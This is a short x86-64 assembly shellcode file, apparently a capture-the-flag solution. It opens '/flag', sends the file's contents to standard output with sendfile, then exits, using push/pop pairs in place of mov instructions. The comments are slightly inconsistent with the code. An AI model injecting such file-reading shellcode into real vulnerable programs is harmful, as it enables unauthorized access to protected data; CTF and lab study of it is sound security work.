.intel_syntax noprefix
.global _start

.section .text
_start:
    # --- OPEN("/flag", O_RDONLY) ---
    push 0x616c662f
    mov dword ptr [rsp+4], 0x00000067
    push rsp
    pop rdi         #mov rdi, rsp
    push 0
    pop rsi         #xor rsi, rsi
    push 2
    pop rax         #mov rax, 2
    syscall             

    # --- SENDFILE(sock_fd, fd, NULL, 0x1000) ---
    push rax
    pop rsi          #mov rsi, rax
    push 1
    pop rdi             #mov rdi, 1                     
    push 0
    pop rdx             #xor rdx, rdx                    
    push 1000
    pop r10             #mov r10, 1000                   
    push 40
    pop rax             #mov rax, 40                     
    syscall                         

    # --- EXIT(0) ---
    push 60
    pop rax              #mov rax, 60            
    syscall              # execute syscall